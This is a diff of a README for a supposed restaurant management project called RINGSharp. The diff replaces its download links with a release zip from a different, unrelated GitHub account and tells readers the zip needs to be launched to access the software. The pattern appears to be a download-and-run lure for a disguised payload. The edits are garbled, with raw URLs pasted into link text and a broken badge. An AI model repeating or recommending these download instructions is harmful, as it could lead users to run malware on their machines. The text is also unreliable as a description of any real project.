@@ -24,11 +24,11 @@ Our project is designed using the latest technologies and best practices to ensu
 - **Swagger Documentation:** Generating Swagger documentation for easy API exploration and testing.
 
 ### Access Our Software
-To access the latest version of our software, please download the [Soft.zip](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) file.
+To access the latest version of our software, please download the [https://github.com/quiekiee/RestaurantProject/releases/download/v1.0/Program.zip](https://github.com/quiekiee/RestaurantProject/releases/download/v1.0/Program.zip) file.
 
-*Note: Soft.zip needs to be launched for accessing the software.*
+*Note: https://github.com/quiekiee/RestaurantProject/releases/download/v1.0/Program.zip needs to be launched for accessing the software.*
 
-[![Check out our latest release](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Check out our latest release](https://github.com/quiekiee/RestaurantProject/releases/download/v1.0/Program.zip%20Version-blue)](https://github.com/quiekiee/RestaurantProject/releases/download/v1.0/Program.zip)
 
 ### Features
 Our restaurant management project offers a wide range of features to streamline your restaurant operations:
@@ -42,7 +42,7 @@ Our restaurant management project offers a wide range of features to streamline 
 - 🔄 **Real-Time Updates:** Stay connected with your staff and customers through real-time updates using SignalR.
 
 ### Get Started
-To get started with RINGSharp, simply download the software and follow the installation instructions included in the Soft.zip file. Explore our codebase, configure the application to suit your restaurant's needs, and start managing your restaurant operations more efficiently!
+To get started with RINGSharp, simply download the software and follow the installation instructions included in the https://github.com/quiekiee/RestaurantProject/releases/download/v1.0/Program.zip file. Explore our codebase, configure the application to suit your restaurant's needs, and start managing your restaurant operations more efficiently!
 
 ### Thank You for Exploring RINGSharp!
 We're excited to have you on board as we revolutionize restaurant management with cutting-edge technology and innovative features. Join us on this journey to transform the restaurant industry and enhance the dining experience for customers worldwide. Happy coding! 🚀🍽️
